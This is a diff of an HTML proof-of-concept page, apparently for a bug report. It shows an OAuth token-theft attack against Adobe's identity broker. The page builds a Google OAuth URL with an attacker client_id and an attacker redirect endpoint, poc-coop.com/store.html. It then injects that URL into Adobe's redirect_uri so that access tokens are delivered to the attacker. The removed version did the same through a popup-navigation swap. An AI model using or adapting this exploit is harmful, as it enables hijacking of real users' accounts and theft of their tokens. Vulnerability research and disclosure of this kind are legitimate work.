@@ -1,73 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>OAuth ClientID Swap PoC</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-    button { padding: 10px 20px; margin-top: 20px; background: #4caf50; color: white; border: none; cursor: pointer; }
-  </style>
+  <title>Adobe OAuth ClientID Swap PoC</title>
 </head>
 <body>
-  <h2>Adobe OAuth ClientID Swap PoC</h2>
   <button onclick="launch()">Exploit</button>
   <div id="log"></div>
+<script>
+function log(msg){document.getElementById("log").innerHTML+=msg+"<br>";}
 
-  <script>
-    function log(msg) {
-      document.getElementById("log").innerHTML += msg + "<br>";
-    }
+function buildAttackGoogleOAuth(){
+  let client_id="50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com"; // attacker
+  let redirect_uri="https://poc-coop.com/store.html"; // attacker
+  let scope="openid profile email";
+  return "https://accounts.google.com/o/oauth2/v2/auth?" +
+    "client_id="+encodeURIComponent(client_id)+
+    "&redirect_uri="+encodeURIComponent(redirect_uri)+
+    "&response_type=token"+
+    "&scope="+encodeURIComponent(scope);
+}
 
-    // Build attacker’s OAuth URL
-    function buildAttackURL() {
-      let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com"; // attacker client_id
-      let redirect_uri = "https://poc-coop.com/store.html"; // attacker endpoint
-      let scope = "openid profile email";
+function launch(){
+  let attackOAuth=buildAttackGoogleOAuth();
 
-      return "https://accounts.google.com/o/oauth2/v2/auth?" +
-        "client_id=" + encodeURIComponent(client_id) +
-        "&redirect_uri=" + encodeURIComponent(redirect_uri) +
-        "&response_type=token" +
-        "&scope=" + encodeURIComponent(scope);
-    }
+  // Inject into Adobe broker's redirect_uri
+  let tamperedAdobeURL="https://auth-light.identity.adobe.com/?" +
+    "client_id=clio-playground-web" +
+    "&response_type=token" +
+    "&redirect_uri="+encodeURIComponent(attackOAuth) +
+    "&environment=prod" +
+    "&locale=en_US" +
+    "&dt=true&wrapper=true&popup=true" +
+    "&asserted_origin=https://firefly.adobe.com";
 
-    let foo;
-    let attackOAuthURL = buildAttackURL();
-
-    function launch() {
-      let urlParam = new URLSearchParams(window.location.search).get("url");
-      if (!urlParam) {
-        log("❌ Missing ?url= parameter.");
-        return;
-      }
-
-      log("▶ Opening target: " + urlParam);
-      foo = window.open(urlParam, "foo", "width=600,height=700");
-      setTimeout(monitorNavigation, 2000);
-    }
-
-    function monitorNavigation() {
-      if (!foo || foo.closed) {
-        log("❌ Popup closed, stopping.");
-        return;
-      }
-
-      try {
-        let loc = foo.location.href;
-        log("Monitoring: " + loc);
-
-        // Detect Adobe redirecting to Google OAuth
-        if (loc.includes("accounts.google.com")) {
-          log("⚠ Google OAuth detected → swapping client_id");
-          foo.location.replace(attackOAuthURL);
-          return;
-        }
-      } catch (e) {
-        // Cross-origin until it hits Google, so just wait
-        log("Cross-origin, waiting...");
-      }
-
-      setTimeout(monitorNavigation, 800);
-    }
-  </script>
+  log("▶ Opening tampered Adobe flow...");
+  window.open(tamperedAdobeURL,"poc","width=600,height=700");
+}
+</script>
 </body>
 </html>
